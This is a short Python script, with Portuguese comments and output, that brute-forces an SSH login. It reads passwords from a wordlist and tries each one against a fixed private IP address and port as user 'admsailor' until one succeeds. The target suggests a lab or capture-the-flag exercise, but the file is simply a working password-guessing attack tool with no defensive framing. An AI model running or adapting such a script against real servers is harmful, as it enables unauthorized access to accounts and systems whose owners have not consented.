#!/usr/bin/python
# you need to install paramiko to use this script
import paramiko, time

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open('wordlist.txt')
for palavra in f.readlines():
        senha = palavra.strip()
        try:
                ssh.connect('172.30.0.126', username='admsailor', password=senha, port=55225)
        except paramiko.ssh_exception.AuthenticationException:
                print("Testando com:",senha)
                ssh.close()
        else:
                print("[+] Senha encontrada:",senha)
                break
ssh.close()
